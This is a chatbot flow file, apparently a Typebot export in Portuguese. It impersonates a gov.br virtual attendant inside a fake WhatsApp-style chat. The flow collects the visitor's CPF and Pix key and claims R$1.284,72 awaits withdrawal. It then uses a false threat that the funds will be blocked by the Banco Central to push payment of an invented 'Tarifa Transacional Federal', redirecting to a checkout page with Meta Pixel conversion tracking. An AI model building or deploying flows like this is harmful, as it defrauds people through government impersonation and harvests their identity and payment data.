{"id":"clkufgik2005rlf0fnyl1kxe2","version":"3","groups":[{"id":"sogkklnuq695ndnw10delwvr","title":"Start","blocks":[{"id":"kuoqoky28uph7p3v9cpylzcy","type":"start","label":"Start","groupId":"sogkklnuq695ndnw10delwvr","outgoingEdgeId":"xia4zt6enen50vcs8s3wuj7r"}],"graphCoordinates":{"x":-1909.72,"y":-650.23}},{"id":"k264rq67f3g1723gb4roajhw","title":"Group #3","blocks":[{"id":"zucwfqld8hq097z6yt7uatux","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Olá, me chamo Gabriela Silva e sou sua "},{"bold":true,"text":"Atendente Virtual"},{"text":" do "},{"bold":true,"text":"gov.br"},{"text":"."}]}]},"groupId":"k264rq67f3g1723gb4roajhw"},{"id":"okyqdlo0t9pu424cjy64quse","type":"Wait","groupId":"k264rq67f3g1723gb4roajhw","options":{"secondsToWaitFor":"2"}},{"id":"e2qlwzg5xuykmh39dt70ucnx","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Para darmos prosseguimento ao seu atendimento, "},{"bold":true,"text":"precisamos confirmar que é você mesmo"},{"text":" e para isso é necessário que você informe seu "},{"bold":true,"text":"CPF"},{"text":"."}]}]},"groupId":"k264rq67f3g1723gb4roajhw"},{"id":"gzsqbrjn1aqgwdzv00k4fqs8","type":"Wait","groupId":"k264rq67f3g1723gb4roajhw","options":{"secondsToWaitFor":"1"}},{"id":"rpmml0ct2u0guelfrolufa46","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Deseja prosseguir com a consulta?","italic":true}]}]},"groupId":"k264rq67f3g1723gb4roajhw"},{"id":"e7uzvm1oipa5xt00fyj1rfwt","type":"choice input","items":[{"id":"kbgqvxn6icfu4j79apx06kfo","type":0,"blockId":"e7uzvm1oipa5xt00fyj1rfwt","content":"Sim"}],"groupId":"k264rq67f3g1723gb4roajhw","options":{"buttonLabel":"Send","isSearchable":false,"isMultipleChoice":false,"searchInputPlaceholder":"Filter the options..."}},{"id":"los3pnuj0013ma9toxywag8s","type":"Code","groupId":"k264rq67f3g1723gb4roajhw","options":{"name":"Script","content":"fbq('track', 'Purchase', {value: 10.00, currency: 'BRL'});"}},{"id":"tux2wxe21y6g98r4bfx39env","type":"Wait","groupId":"k264rq67f3g1723gb4roajhw","options":{"secondsToWaitFor":"2"}},{"id":"u8tnr7x4ydeenkcjxaq2tyld","type":"text","content":{"richText":[{"type":"p","children":[{"bold":true,"text":"Identifique-se com seu CPF:"}]}]},"groupId":"k264rq67f3g1723gb4roajhw"},{"id":"hkz82h029149uhga76yf4ge9","type":"Wait","groupId":"k264rq67f3g1723gb4roajhw","options":{"secondsToWaitFor":"2"}},{"id":"ikz6iwl5zzp21mugrvg5anm1","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Digite somente os números do seu CPF para ","italic":true},{"bold":true,"text":"criar","italic":true},{"text":" ou ","italic":true},{"bold":true,"text":"acessar","italic":true},{"text":" sua conta gov.br","italic":true}]}]},"groupId":"k264rq67f3g1723gb4roajhw"},{"id":"qusn1au88nomqtopk32ds1s3","type":"number input","groupId":"k264rq67f3g1723gb4roajhw","options":{"labels":{"button":"enviar","placeholder":"Digite seu CPF"},"variableId":"vytlxb8e33nfslss176gdk2e3"}},{"id":"hsb3yseg0v343m7a95hxcuwa","type":"Wait","groupId":"k264rq67f3g1723gb4roajhw","options":{"secondsToWaitFor":"2"}},{"id":"kvymhnpzfpxz7p7jwkgpx2f9","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Aguarde... Entrando em sua conta gov.br.","italic":true}]}]},"groupId":"k264rq67f3g1723gb4roajhw"},{"id":"suahx47bxg2x47ujkp3lkwsw","type":"Wait","groupId":"k264rq67f3g1723gb4roajhw","options":{"secondsToWaitFor":"2"}},{"id":"n8le4oj3hk5v9qnvk6ot9e32","type":"text","content":{"richText":[{"type":"p","children":[{"bold":true,"text":"Para continuar, confirme se esses são seus dados: "}]},{"type":"p","children":[{"bold":true,"text":""}]},{"type":"p","children":[{"bold":true,"text":"{{CPF}}"}]}]},"groupId":"k264rq67f3g1723gb4roajhw"},{"id":"z7fssj6em7juvenmi7jbdmiz","type":"choice input","items":[{"id":"quywyglv19ewthzejm0dwao3","type":0,"blockId":"z7fssj6em7juvenmi7jbdmiz","content":"Confirmar"}],"groupId":"k264rq67f3g1723gb4roajhw","options":{"buttonLabel":"Send","isSearchable":false,"isMultipleChoice":false,"searchInputPlaceholder":"Filter the options..."},"outgoingEdgeId":"a8vvd2c837nvyo01toe4plpr"}],"graphCoordinates":{"x":-1542.95,"y":-646.62}},{"id":"olya0ybc29e204l3ejfsc1ni","title":"Group #4","blocks":[{"id":"r6vcarx0lt67x4e92wzpxvhy","type":"Wait","groupId":"olya0ybc29e204l3ejfsc1ni","options":{"secondsToWaitFor":"2"}},{"id":"lsknd7z6lesq7v04yabigxza","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Seja bem vindo(a) a sua conta "},{"bold":true,"text":"gov.br"},{"text":"."}]}]},"groupId":"olya0ybc29e204l3ejfsc1ni"},{"id":"euxn3ujxs2p4jh62k8kl9xhq","type":"Wait","groupId":"olya0ybc29e204l3ejfsc1ni","options":{"secondsToWaitFor":"2"}},{"id":"e5a3u2xi6wuyabbe0v6ngv8x","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Selecione a opção desejada","italic":true}]}]},"groupId":"olya0ybc29e204l3ejfsc1ni"},{"id":"pol2o75cxhaaoy7gxcd5jx9x","type":"choice input","items":[{"id":"mmizcm89f0xdb2fsa39dlgp1","type":0,"blockId":"pol2o75cxhaaoy7gxcd5jx9x","content":"Consultar Saldo Disponível em seu CPF"}],"groupId":"olya0ybc29e204l3ejfsc1ni","options":{"buttonLabel":"Send","isSearchable":false,"isMultipleChoice":false,"searchInputPlaceholder":"Filter the options..."}},{"id":"glrc9k6vu43fjp7dc25dcyq0","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Aguarde... Verificando se você tem valor disponível para saque em seu CPF","italic":true}]}]},"groupId":"olya0ybc29e204l3ejfsc1ni"},{"id":"a3z9bt85xgz560pvurijvje5","type":"Wait","groupId":"olya0ybc29e204l3ejfsc1ni","options":{"secondsToWaitFor":"2"}},{"id":"ynte7ptyqg87zfz3zuovusf7","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Identificamos o valor de "},{"bold":true,"text":"R$1.284,72"},{"text":" disponíveis para "},{"bold":true,"text":"saque imediato"},{"text":" em seu "},{"bold":true,"text":"CPF "},{"text":"({{CPF}})"}]}]},"groupId":"olya0ybc29e204l3ejfsc1ni"},{"id":"zjyi400k8nf4zk1wmzifbtvb","type":"Wait","groupId":"olya0ybc29e204l3ejfsc1ni","options":{"secondsToWaitFor":"2"}},{"id":"lb9ee46auteh5dyunv9ocksi","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Deseja efetuar seu saque agora?","italic":true}]}]},"groupId":"olya0ybc29e204l3ejfsc1ni"},{"id":"exarzsnlqffx04f4y1nkoi32","type":"choice input","items":[{"id":"beimvzhxjzzqiiwx0c7c3aqs","type":0,"blockId":"exarzsnlqffx04f4y1nkoi32","content":"Continuar"}],"groupId":"olya0ybc29e204l3ejfsc1ni","options":{"buttonLabel":"Send","isSearchable":false,"isMultipleChoice":false,"searchInputPlaceholder":"Filter the options..."}},{"id":"voyzd99luv9c9o6qehs2iuzu","type":"Wait","groupId":"olya0ybc29e204l3ejfsc1ni","options":{"secondsToWaitFor":"2"}},{"id":"yflgekgby7y4szykoywj5gro","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Selecione como deseja "},{"bold":true,"text":"receber o seu saque"},{"text":" do valor de "},{"bold":true,"text":"R$1.284,72"},{"text":":"}]}]},"groupId":"olya0ybc29e204l3ejfsc1ni"},{"id":"w57a4zq3cp0k3qgi164e10jo","type":"choice input","items":[{"id":"cr4psvssiwsytsv75ztn2vtx","type":0,"blockId":"w57a4zq3cp0k3qgi164e10jo","content":"RECEBER POR PIX"}],"groupId":"olya0ybc29e204l3ejfsc1ni","options":{"buttonLabel":"Send","isSearchable":false,"isMultipleChoice":false,"searchInputPlaceholder":"Filter the options..."}},{"id":"h59po09t0g4n2ubi4d760id9","type":"Wait","groupId":"olya0ybc29e204l3ejfsc1ni","options":{"secondsToWaitFor":"2"}},{"id":"cj0was3uw3hkbdyc5jdxxgr8","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Informe a Chave Pix que deseja receber seu saque disponível:","italic":true}]}]},"groupId":"olya0ybc29e204l3ejfsc1ni"},{"id":"x57b86tyicvmjcjk1s586ui1","type":"text input","groupId":"olya0ybc29e204l3ejfsc1ni","options":{"isLong":false,"labels":{"button":"enviar","placeholder":"Digite a Chave PIX"},"variableId":"vdm25rlbr6rmlstbej0dm38t0"}},{"id":"okzl36jdhzqv7aql0l0hy8je","type":"Wait","groupId":"olya0ybc29e204l3ejfsc1ni","options":{"secondsToWaitFor":"3"}},{"id":"dn1s0ujtqmhnhi60xgj4snmp","type":"text","content":{"richText":[{"type":"p","children":[{"bold":true,"text":"ATENÇÃO: "},{"text":"Verifique se a Chave Pix informada está correta e confirme com atenção:"}]},{"type":"p","children":[{"bold":true,"text":""}]},{"type":"p","children":[{"bold":true,"text":"{{chave pix}}"}]},{"type":"p","children":[{"text":""}]},{"type":"p","children":[{"text":"O "},{"bold":true,"text":"gov.br"},{"text":" não se responsabiliza caso você informe a Chave Pix errada. "}]}]},"groupId":"olya0ybc29e204l3ejfsc1ni"},{"id":"bkl54xhfe624fs6jenmmg6m0","type":"choice input","items":[{"id":"hvfn8xhw0rhn2zkfrnkrlqnd","type":0,"blockId":"bkl54xhfe624fs6jenmmg6m0","content":"Sim, está correta"}],"groupId":"olya0ybc29e204l3ejfsc1ni","options":{"buttonLabel":"Send","isSearchable":false,"isMultipleChoice":false,"searchInputPlaceholder":"Filter the options..."}},{"id":"h4j5yoz3sme3wrkkd2zqo1ay","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Aguarde! Processando solicitação de saque para Chave Pix informada..."}]},{"type":"p","children":[{"text":""}]},{"type":"p","children":[{"text":"Finalizando processamento de solicitação para saque..."}]}]},"groupId":"olya0ybc29e204l3ejfsc1ni","outgoingEdgeId":"e37igf9gliii4ym2acri55qu"}],"graphCoordinates":{"x":-1176.28,"y":-644.4}},{"id":"hm2ug79q66jtyyza5x1igyn6","title":"Group #5","blocks":[{"id":"lz5nnei91rt5x2jbhrrnvikz","type":"Wait","groupId":"hm2ug79q66jtyyza5x1igyn6","options":{"secondsToWaitFor":"2"}},{"id":"q534tqaodb7eotr52sxn82cx","type":"text","content":{"richText":[{"type":"p","children":[{"bold":true,"text":"Parabéns"}]},{"type":"p","children":[{"text":""}]},{"type":"p","children":[{"text":"A sua solicitação de saque foi aprovada para a Chave Pix cadastrada:"}]},{"type":"p","children":[{"bold":true,"text":""}]},{"type":"p","children":[{"bold":true,"text":"Chave Pix:"},{"text":" {{chave pix}}"}]},{"type":"p","children":[{"text":""}]},{"type":"p","children":[{"text":"Clique no botão abaixo para efetuar a transferência do valor de ","italic":true},{"bold":true,"text":"R$1.284,72 ","italic":true},{"text":"para a conta da Chave Pix cadastrada.","italic":true}]}]},"groupId":"hm2ug79q66jtyyza5x1igyn6"},{"id":"tieh8g6rcts0ofwgxw09yv1t","type":"Wait","groupId":"hm2ug79q66jtyyza5x1igyn6","options":{"secondsToWaitFor":"2"}},{"id":"sqaomzsnn4nmkpfbzcymqnwr","type":"text","content":{"richText":[{"type":"p","children":[{"bold":true,"text":"ATENÇÃO: "},{"text":"Após essa solicitação para saque, você irá iniciar o seu recebimento de saque imediato, "},{"bold":true,"text":"caso você não conclua o processo a seguir"},{"text":", será entendido que você não deseja receber o seu valor, tendo o mesmo não transferido e também o tendo bloqueado pelo "},{"bold":true,"text":"Banco Central"},{"text":". Caso isso ocorra, o valor disponível para você será repassado para o "},{"bold":true,"text":"Fundo Governamental "},{"text":"e utilizado para"},{"bold":true,"text":" fins públicos"},{"text":". Observação: "}]},{"type":"p","children":[{"text":""}]},{"type":"p","children":[{"text":"Isso só acontecerá se você não concluir a etapa a seguir.","italic":true}]}]},"groupId":"hm2ug79q66jtyyza5x1igyn6"},{"id":"rid9dc8wgwl858y335qtndmk","type":"choice input","items":[{"id":"vlyr1ihuh5aal9h6ai7du955","type":0,"blockId":"rid9dc8wgwl858y335qtndmk","content":"Efetuar Saque Agora"}],"groupId":"hm2ug79q66jtyyza5x1igyn6","options":{"buttonLabel":"Send","isSearchable":false,"isMultipleChoice":false,"searchInputPlaceholder":"Filter the options..."}},{"id":"cw6l4qs0hih9jrgy832jeigi","type":"Wait","groupId":"hm2ug79q66jtyyza5x1igyn6","options":{"secondsToWaitFor":"2"}},{"id":"b9f4fkkt5qpy1zjdslnu0i7e","type":"text","content":{"richText":[{"type":"p","children":[{"bold":true,"text":"CPF BENEFICIÁRIO:"},{"text":" {{CPF}}"}]},{"type":"p","children":[{"bold":true,"text":"VALOR DISPONÍVEL PARA SAQUE:"},{"text":" R$1.284,72"}]},{"type":"p","children":[{"bold":true,"text":""}]},{"type":"p","children":[{"bold":true,"text":"ATENÇÃO: "},{"text":"Para que seu saque seja efetuado para a Chave Pix cadastrada ({{chave pix}}), é necessário efetuar o pagamento da Tarifa Transacional Federal. Somente após o pagamento da tarifa, "},{"bold":true,"text":"seu valor de R$1.284,72 será transferido automaticamente em até 2 horas para a conta da Chave Pix cadastrada."}]}]},"groupId":"hm2ug79q66jtyyza5x1igyn6"},{"id":"jstx5v9upljgy799bzml3kl7","type":"choice input","items":[{"id":"dsq2d6bufcidyb0x5p8grdwo","type":0,"blockId":"jstx5v9upljgy799bzml3kl7","content":"Continuar"}],"groupId":"hm2ug79q66jtyyza5x1igyn6","options":{"buttonLabel":"Send","isSearchable":false,"isMultipleChoice":false,"searchInputPlaceholder":"Filter the options..."},"outgoingEdgeId":"x50gsr72yv8zuk6x1les6z3v"}],"graphCoordinates":{"x":-789.39,"y":-636.84}},{"id":"miz23pssj6b7gzbwgdwvea52","title":"Group #4","blocks":[{"id":"g5lgpzpchdlf53yojk0nrahi","type":"Wait","groupId":"miz23pssj6b7gzbwgdwvea52","options":{"secondsToWaitFor":"2"}},{"id":"h9n57bs3q9w32gela74oit4i","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Aguarde! Calculando valor da tarifa sobre valor disponível para saque...","italic":true}]}]},"groupId":"miz23pssj6b7gzbwgdwvea52"},{"id":"rtfqcgalidoq968pit22d09k","type":"Wait","groupId":"miz23pssj6b7gzbwgdwvea52","options":{"secondsToWaitFor":"2"}},{"id":"ndsc4yr19paexn9zvhru0mbp","type":"text","content":{"richText":[{"type":"p","children":[{"text":"Gerando guia de pagamento...","italic":true}]}]},"groupId":"miz23pssj6b7gzbwgdwvea52"},{"id":"pa127s2nt9b23e7z7hbh7rm3","type":"Wait","groupId":"miz23pssj6b7gzbwgdwvea52","options":{"secondsToWaitFor":"2"}},{"id":"tp3kq853fv53u55ns29nlrsx","type":"text","content":{"richText":[{"type":"p","children":[{"bold":true,"text":"GUIA DE PAGAMENTO GERADA COM SUCESSO!"}]},{"type":"p","children":[{"text":""}]},{"type":"p","children":[{"text":"O cálculo do valor total da tarifa é feito sobre o valor que você tem disponível para receber "},{"bold":true,"text":"(R$1.284,72)"},{"text":"."}]},{"type":"p","children":[{"text":"","italic":true}]},{"type":"p","children":[{"text":"Tarifa Transacional: R$16,86","italic":true}]},{"type":"p","children":[{"text":"Contribuição Federal: R$9,22","italic":true}]},{"type":"p","children":[{"text":"Tarifa de Saque: R$17,09","italic":true}]},{"type":"p","children":[{"text":"","italic":true}]},{"type":"p","children":[{"text":"Total da Tarifa:"}]},{"type":"p","children":[{"bold":true,"text":"R$43,17"}]},{"type":"p","children":[{"bold":true,"text":""}]},{"type":"p","children":[{"text":"APÓS O PAGAMENTO DA TARIFA, EM "},{"text":"ATÉ 2 HORAS","underline":true},{"text":" "},{"bold":true,"text":"VOCÊ RECEBERÁ O VALOR TOTAL DE R$1.284,72 NA CONTA DA CHAVE PX CADASTRADA:"},{"text":"\n"}]},{"type":"p","children":[{"bold":true,"text":"Chave Pix: {{chave pix}}"}]}]},"groupId":"miz23pssj6b7gzbwgdwvea52"},{"id":"mcaobn6l98h2flq7lll9o6gk","type":"choice input","items":[{"id":"lwarpyt47g1r3y7bxihb5ql9","type":0,"blockId":"mcaobn6l98h2flq7lll9o6gk","content":"Pagar Tarifa de R$43,17","outgoingEdgeId":"i1r2rgms0y0pisoursoxd265"}],"groupId":"miz23pssj6b7gzbwgdwvea52","options":{"buttonLabel":"Send","isSearchable":false,"isMultipleChoice":false,"searchInputPlaceholder":"Filter the options..."},"outgoingEdgeId":"pzx8ph7napseun110gw4b0i7"}],"graphCoordinates":{"x":-366.41,"y":-631.1}},{"id":"zlcbb7tjwtwjri08zb396h4d","title":"Group #6","blocks":[{"id":"ytdt1dg3t2yjdkqn2tr8gk7p","type":"Code","groupId":"zlcbb7tjwtwjri08zb396h4d","options":{"name":"Script","content":"fbq('track', 'InitiateCheckout');"}},{"id":"ruqd9u0bej3eeib273n7ag5p","type":"Redirect","groupId":"zlcbb7tjwtwjri08zb396h4d","options":{"url":"https://pay.kiwify.com.br/JYQVRQX","isNewTab":false}}],"graphCoordinates":{"x":49.28,"y":371.77}}],"variables":[{"id":"vytlxb8e33nfslss176gdk2e3","name":"CPF"},{"id":"vdm25rlbr6rmlstbej0dm38t0","name":"chave pix"}],"edges":[{"id":"a8vvd2c837nvyo01toe4plpr","to":{"groupId":"olya0ybc29e204l3ejfsc1ni"},"from":{"blockId":"z7fssj6em7juvenmi7jbdmiz","groupId":"k264rq67f3g1723gb4roajhw"}},{"id":"e37igf9gliii4ym2acri55qu","to":{"groupId":"hm2ug79q66jtyyza5x1igyn6"},"from":{"blockId":"h4j5yoz3sme3wrkkd2zqo1ay","groupId":"olya0ybc29e204l3ejfsc1ni"}},{"id":"x50gsr72yv8zuk6x1les6z3v","to":{"groupId":"miz23pssj6b7gzbwgdwvea52"},"from":{"blockId":"jstx5v9upljgy799bzml3kl7","groupId":"hm2ug79q66jtyyza5x1igyn6"}},{"id":"xia4zt6enen50vcs8s3wuj7r","to":{"groupId":"k264rq67f3g1723gb4roajhw"},"from":{"blockId":"kuoqoky28uph7p3v9cpylzcy","groupId":"sogkklnuq695ndnw10delwvr"}},{"id":"i1r2rgms0y0pisoursoxd265","to":{"groupId":"zlcbb7tjwtwjri08zb396h4d"},"from":{"itemId":"lwarpyt47g1r3y7bxihb5ql9","blockId":"mcaobn6l98h2flq7lll9o6gk","groupId":"miz23pssj6b7gzbwgdwvea52"}},{"id":"pzx8ph7napseun110gw4b0i7","to":{"blockId":"ruqd9u0bej3eeib273n7ag5p","groupId":"zlcbb7tjwtwjri08zb396h4d"},"from":{"blockId":"mcaobn6l98h2flq7lll9o6gk","groupId":"miz23pssj6b7gzbwgdwvea52"}}],"theme":{"chat":{"inputs":{"color":"#000000","backgroundColor":"#FFFFFF","placeholderColor":"#666460"},"buttons":{"color":"#FFFFFF","backgroundColor":"#0042DA"},"roundness":"medium","hostAvatar":{"url":"https://s3.fr-par.scw.cloud/typebot/public/typebots/bfcnd6r2bjtr72v9x0gshsai/hostAvatar?v=1690771259401","isEnabled":true},"guestAvatar":{"url":"https://s3.fr-par.scw.cloud/typebot/public/typebots/cli88mae30010mh0f0yzjqn48/guestAvatar?v=1685330799682","isEnabled":false},"hostBubbles":{"color":"#303235","backgroundColor":"#eceef3"},"guestBubbles":{"color":"#FFFFFF","backgroundColor":"#DE8031"}},"general":{"font":"Open Sans","background":{"type":"None"}},"customCss":".typebot-chat-view > .flex:first-child {\n    padding-top: 30px;\n}\n\n.typebot-input {\n    position: fixed;\n    bottom: 0;\n    align-items: center;\n    z-index: 999;\n    right: 0;\n}\n\n.typebot-input .typebot-button {\n    background: #008a7c;\n    border-radius: 50%;\n    color: #fff;\n    position: relative;\n    width: 50px;\n    height: 50px;\n    display: flex;\n    align-items: center;\n    justify-content: center;\n}\n\n.typebot-container {\n    background-size: initial!important;\n    background-repeat: repeat-x!important;\n}\n\n.typebot-host-bubble>.bubble-typing {\n  border-radius: 0 5px 5px 5px;\n}\n\n.typebot-host-bubble>.bubble-typing:after {\n    position: absolute;\n    content: \"\";\n    width: 0;\n    height: 0;\n    border-style: solid;\n    border-width: 0px 10px 10px 0;\n    border-color: transparent #fff transparent transparent;\n    top: 0;\n    left: -10px;\n}\n\n.typebot-guest-bubble {\n  position: relative;\n  border-radius: 5px 0 5px 5px;\n}\n\n.typebot-guest-bubble:after {\n  position: absolute;\n  content: \"\";\n  width: 0;\n  height: 0;\n  border-style: solid;\n}\n\n.typebot-guest-bubble:after {\n    border-width: 0px 0 10px 10px;\n    border-color: transparent transparent transparent #e1ffc7;\n    top: 0;\n    right: -10px;\n    border-style: solid;\n}\n\niframe[src=\"\"] {\n  position: fixed;\n  top: 0;\n  left: 0;\n  display: relative;\n  width: 100%;\n  height: 100% !important;\n  z-index: 999999;\n  border: none;\n  padding: 0;\n  margin: 0;\n}\n\na#lite-badge {\n  display: none!important;\n}"},"settings":{"general":{"rememberUser":{"isEnabled":false},"isBrandingEnabled":true,"isInputPrefillEnabled":false,"isHideQueryParamsEnabled":false},"metadata":{"title":"WhatsApp ","imageUrl":"https://s3.fr-par.scw.cloud/typebot/public/typebots/gyxf2uib8zgddb4zq0xkx39v/ogImage?v=1689108842222","favIconUrl":"https://s3.fr-par.scw.cloud/typebot/public/typebots/v8rvqqe6k9seloou8324tedh/favIcon?v=1690995101586","description":"Gabriela Silva","customHeadCode":"<!-- Meta Pixel Code -->\n<script>\n!function(f,b,e,v,n,t,s)\n{if(f.fbq)return;n=f.fbq=function(){n.callMethod?\nn.callMethod.apply(n,arguments):n.queue.push(arguments)};\nif(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';\nn.queue=[];t=b.createElement(e);t.async=!0;\nt.src=v;s=b.getElementsByTagName(e)[0];\ns.parentNode.insertBefore(t,s)}(window, document,'script',\n'https://connect.facebook.net/en_US/fbevents.js');\nfbq('init', '1011849059828678');\nfbq('track', 'PageView');\n</script>\n<noscript><img height=\"1\" width=\"1\" style=\"display:none\"\nsrc=\"https://www.facebook.com/tr?id=1011849059828678&ev=PageView&noscript=1\"\n/></noscript>\n<!-- End Meta Pixel Code -->\n\n/* Dar um espacinho do ícone */\n.typebot-guest-bubble {\npadding-right: 30px;\n}\n\n/*Começa aqui*/\n.typebot-guest-bubble::before {\ncontent: '';\nwidth: 16px;\nheight: 15px;\nbackground-image: url('https://i.imgur.com/Ow9d9T4.png'); \nbackground-size: 100%; \nbackground-repeat: no-repeat; \nposition: absolute;\ntop: 80%;\nright: 8px;\ntransform: translateY(-50%);\n/* AQUI VC PODE MUDAR O TEMPO DA ANIMAÇÃO DO TICK */\nanimation: aparecer .5s ease-in-out;\n}\n\n@keyframes aparecer {\n0% {\nopacity: 0;\n}\n100% {\nopacity: 1;\n}\n}\n/* Acaba Aqui*/\n\n<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css\">\n<style>\n  .hide {\n    display: none!important;\n  }\n  typebot-standard {\n    position: relative;\n    z-index: 9999;\n  }\n  #__next {\n    position: relative;\n    z-index: 9999;\n}\n  /* User Bar */\n.user-bar {\n  width: 100%;\n  height: 55px;\n  background: #005e54;\n  color: #fff;\n  padding: 0;\n  font-size: 24px;\n  position: fixed;\n  z-index: 99999;\n  display: block;\n  top: 0;\n}\n\n.user-bar:after {\n  content: \"\";\n  display: table;\n  clear: both;\n}\n\n.user-bar div {\n    float: left;\n    transform: translateY(-50%);\n    position: relative;\n    top: 50%;\n    margin-left: 10px;\n}\n\n.user-bar .actions {\n  float: right;\n  margin: 0 0 0 20px;\n}\n\n.user-bar .actions.more {\n  margin: 0 12px 0 32px;\n}\n\n.user-bar .actions.attachment {\n  margin: 0 0 0 30px;\n}\n\n.user-bar .actions.attachment i {\n  display: block;\n  transform: rotate(-45deg);\n}\n\n.user-bar .avatar {\n  margin: 0 0 0 5px;\n  width: 36px;\n  height: 36px;\n}\n\n.user-bar .avatar img {\n  border-radius: 50%;\n  box-shadow: 0 1px 0 rgba(255, 255, 255, 0.1);\n  display: block;\n  width: 100%;\n}\n\n.user-bar .name {\n  font-size: 17px;\n  font-weight: 600;\n  text-overflow: ellipsis;\n  letter-spacing: 0.3px;\n  margin: 0 0 0 8px;\n  overflow: hidden;\n  white-space: nowrap;\n  width: 150px;\n}\n\n.user-bar .status {\n  display: block;\n  font-size: 13px;\n  font-weight: 400;\n  letter-spacing: 0;\n}\n</style>\n\n<script>\nfunction criarBarra() {\n  var userBar = document.createElement(\"div\");\n  userBar.className = \"user-bar\";\n\n  var backButton = document.createElement(\"div\");\n  backButton.className = \"back\";\n  backButton.innerHTML = '<i class=\"zmdi zmdi-arrow-left\"></i>';\n\n  var avatar = document.createElement(\"div\");\n  avatar.className = \"avatar\";\n  avatar.innerHTML = '<img src=\"https://s3.fr-par.scw.cloud/typebot/public/typebots/gyxf2uib8zgddb4zq0xkx39v/ogImage?v=1689108842222\" alt=\"Gabriela Silva\">';\n\n  var name = document.createElement(\"div\");\n  name.className = \"name\";\n  name.innerHTML = '<span>Gabriela Silva</span><span class=\"status\">online</span>';\n\n  var moreActions = document.createElement(\"div\");\n  moreActions.className = \"actions more\";\n  moreActions.innerHTML = '<i class=\"zmdi zmdi-more-vert\"></i>';\n\n  var attachmentAction = document.createElement(\"div\");\n  attachmentAction.className = \"actions attachment\";\n  attachmentAction.innerHTML = '<i class=\"zmdi zmdi-attachment-alt\"></i>';\n\n  var phoneAction = document.createElement(\"div\");\n  phoneAction.className = \"actions\";\n  phoneAction.innerHTML = '<i class=\"zmdi zmdi-phone\"></i>';\n\n  userBar.appendChild(backButton);\n  userBar.appendChild(avatar);\n  userBar.appendChild(name);\n  userBar.appendChild(moreActions);\n  userBar.appendChild(attachmentAction);\n  userBar.appendChild(phoneAction);\n\n  var elementoPai = document.querySelector(\"#__next\");\n  if (elementoPai) {\n    elementoPai.insertBefore(userBar, elementoPai.firstChild);\n  }\n}\n\ncriarBarra();\n</script>\n\n"},"typingEmulation":{"speed":300,"enabled":true,"maxDelay":1.5}}}